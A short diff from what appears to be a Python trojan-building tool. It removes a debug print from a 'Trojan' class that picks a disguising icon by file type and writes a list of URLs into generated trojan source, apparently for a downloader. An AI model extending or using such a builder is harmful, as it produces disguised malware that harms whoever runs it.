@@ -34,9 +34,7 @@ class Trojan:
 		self.icon = "icons/" + file_type + ".ico"
 		if icon != None:
 			self.icon = icon
-			
-		print(self.icon)
-		
+					
 	def create(self):
 		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
